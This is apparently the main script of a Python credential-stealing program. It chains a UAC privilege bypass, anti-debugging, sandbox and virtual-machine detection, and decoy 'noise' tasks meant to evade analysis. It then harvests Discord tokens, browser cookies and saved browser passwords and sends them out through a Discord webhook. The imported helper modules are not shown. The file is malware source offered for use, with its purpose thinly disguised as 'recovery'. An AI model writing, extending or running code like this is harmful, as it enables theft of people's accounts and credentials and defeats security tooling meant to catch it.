import sys
import asyncio
import logging
import random
import atexit
from typing import List

from Cores.Cookies import CookieRecovery
from Cores.Discord import DiscordTokenRecovery
from Cores.Browser import BrowserPasswordRecovery
from Utilities.MemoryManager import MemoryHandler
from Protections.Debugger import AntiDebugger
from Protections.System import SystemChecks
from Protections.Noise import NoiseGenerator
from Protections.Biosversion import BIOSVersionChecker
from Protections.Forbiddenprocess import ForbiddenProcessCheck
from Protections.Pseudodevices import PseudoDevices
from Protections.Nestedvirtualization import NestedVirtualizationChecker
from Protections.Windowssandbox import WindowsSandboxChecker

from Utilities.Webhook import WebhookEncryptor, retrieve_saved_data
from Utilities.UAC import UACBypass

logging.basicConfig(level=logging.INFO)


class CheckFailedException(Exception):
    pass


class Checks:
    def __init__(self, *check_modules):
        self.check_modules = check_modules

    async def run_all(self):
        logging.info("Starting checks...")
        for check_module in self.check_modules:
            methods_to_try = ["run_checks", "run_anti_debugging_checks", "run_system_checks"]
            method_found = False
            for method_name in methods_to_try:
                if hasattr(check_module, method_name):
                    method = getattr(check_module, method_name)
                    if asyncio.iscoroutinefunction(method):
                        result = await method()
                    else:
                        result = await asyncio.to_thread(method)
                    if result:
                        raise CheckFailedException(f"{check_module.__class__.__name__} checks failed!")
                    method_found = True
                    break
            if not method_found:
                raise Exception(f"{check_module.__class__.__name__} has no recognized check method!")
        logging.info("All checks passed successfully.")


class Recovery:
    def __init__(self, *recovery_modules):
        self.recovery_modules = recovery_modules

    async def recover_all(self):
        logging.info("Starting recovery process...")
        for recovery_module in self.recovery_modules:
            methods_to_try = ["recover", "extract_tokens", "recover_data", "extract_all_browser_data"]
            method_found = False
            for method_name in methods_to_try:
                if hasattr(recovery_module, method_name):
                    method = getattr(recovery_module, method_name)
                    await method() if asyncio.iscoroutinefunction(method) else method()
                    method_found = True
                    break
            if not method_found:
                raise Exception(f"{recovery_module.__class__.__name__} has no recognized recovery method!")
        logging.info("Recovery process completed.")


class TaskManager:
    def __init__(self, checks: Checks, recovery: Recovery, noise_tasks_methods: List[callable]):
        self.checks = checks
        self.recovery = recovery
        self.noise_tasks_methods = noise_tasks_methods

    async def manage(self):
        noise_tasks = [asyncio.create_task(method()) for method in self.noise_tasks_methods]
        await asyncio.sleep(random.uniform(0.5, 1.6))
        try:
            await self.checks.run_all()
            await self.recovery.recover_all()
        except CheckFailedException as e:
            logging.error(f"Checks failed: {e}")
            sys.exit("Exiting due to CheckFailedException")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
            sys.exit("Exiting due to unexpected error")
        finally:
            for task in noise_tasks:
                task.cancel()
            await asyncio.sleep(1)

async def run_uac_bypass():
    uac = UACBypass()
    success = await uac.run_checks()
    if success:
        logging.info("UAC bypass was successful!")
    else:
        logging.warning("UAC bypass failed, but continuing execution.")


async def main(memory_handler: MemoryHandler, task_manager: TaskManager):
    await run_uac_bypass()

    atexit.register(memory_handler.memory_manager.release_memory)
    await task_manager.manage()

    # Send the saved data to Discord
    saved_data = retrieve_saved_data()
    if saved_data:
        encryptor = WebhookEncryptor()
        encryptor.send_data_to_discord(saved_data)

if __name__ == "__main__":
    checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck(), BIOSVersionChecker(), PseudoDevices(), NestedVirtualizationChecker(), WindowsSandboxChecker())
    recovery = Recovery(DiscordTokenRecovery(), CookieRecovery(), BrowserPasswordRecovery())
    noise_methods = [
        NoiseGenerator.create_noise, 
        NoiseGenerator.create_alternate_noise, 
        NoiseGenerator.random_string_generator, 
        NoiseGenerator.math_noise, 
        NoiseGenerator.activity_simulation,
        NoiseGenerator.misleading_string_generator
    ]
    task_manager = TaskManager(checks, recovery, noise_methods)
    
    memory_handler = MemoryHandler()
    asyncio.run(main(memory_handler, task_manager))